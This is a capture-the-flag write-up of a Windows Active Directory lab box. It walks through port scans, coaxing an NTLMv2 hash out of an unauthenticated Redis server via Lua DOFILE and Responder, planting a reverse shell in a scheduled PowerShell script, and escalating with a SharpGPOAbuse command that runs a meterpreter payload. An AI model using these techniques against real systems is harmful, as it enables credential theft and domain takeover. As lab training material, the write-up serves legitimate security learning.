
# Initial Enumeration
## NMAP Top 1000 with Versions and Scripts
```
PORT    STATE SERVICE       REASON  VERSION
53/tcp  open  domain        syn-ack Simple DNS Plus
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
464/tcp open  kpasswd5?     syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 37084/tcp): CLEAN (Timeout)
|   Check 2 (port 25628/tcp): CLEAN (Timeout)
|   Check 3 (port 53810/udp): CLEAN (Timeout)
|   Check 4 (port 30869/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-04T17:31:11
|_  start_date: N/A
```

## NMAP Full Port Sweep 
```
PORT      STATE SERVICE      REASON
53/tcp    open  domain       syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
464/tcp   open  kpasswd5     syn-ack
6379/tcp  open  redis        syn-ack
9389/tcp  open  adws         syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack
49670/tcp open  unknown      syn-ack
49673/tcp open  unknown      syn-ack
49688/tcp open  unknown      syn-ack
49714/tcp open  unknown      syn-ack

```

## Enum4Linux-ng Interesting Output
```
[*] Checking SMB            
[+] SMB is accessible on 445/tcp              
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ==========================================
|    RPC Session Check on 10.10.208.250    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''


 ====================================================
|    Domain Information via RPC for 10.10.208.250    |
 ====================================================
[+] Domain: VULNNET
[+] SID: S-1-5-21-1405206085-1650434706-76331420
[+] Host is part of a domain (not a workgroup)
```


## Redis Enumeration
The redis install running on port 6379 doesn't require authentication so we can collect information with 
`CONFIG GET *`
This leaks a username
`enterprise-security`

### LUA DOFILE
We are able to pull files from the local system using `EVAL 'DOFILE("<SMB SHARE>") 0'`

If we catch this process on responder to give us a user NTLMv2 hash
```
enterprise-security::VULNNET:4af
<SNIPPET>
00000800300030000000000000000000000000300000B6F1A5003AA3B5FB0DE3A974E4DEF80283D1B5F1E3C8C6D01A3FF59DD12EDC4A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310031002E00340031002E00380033000000000000000000
```

This cracks down to `Redacted`

# Credentials
 Obtained from Redis config and dofile onto a Responder SMB share
```
enterprise-security:sa<REDACTED>98
```


## Authenticated Enumeration
Piping these credentials into [[CrackMapExec]] we found that we have READ access to the `Enterprise-Share`  SMB share. 

This contained `PurgeIrrelevantData_1826.ps1` 

PurgeIrrelevantData_1826.ps1:
```
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```


Pulling this file from SMB and putting in a powershell reverse shell, we can get a call back from the task scheduler executing the updated file.



## Privesc

We can see from running bloodhound that we have generic write privileges on security-policy-vn 

We can use a PowerTool module (This didn't work in my case) or you can use SharpGPOAbuse.exe created by F-Secure
[https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

Note you can either compile SharpGPOAbuse.exe yourself from the f-secure repo
or you can download a pre-compiled version from 
[https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0)

Upload a meterpreter shell and create your immediate task like so.
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author "VULNNET\Administrator" --Command "cmd.exe" --Arguments "/c C:\Enterprise-Share\shelly.exe" --GPOName "security-pol-vn" --Force
```

Once you have injected your task, you will need to force a Group Policy update with the following
```
GNUpdate /force
```

With any luck you should gain a root shell.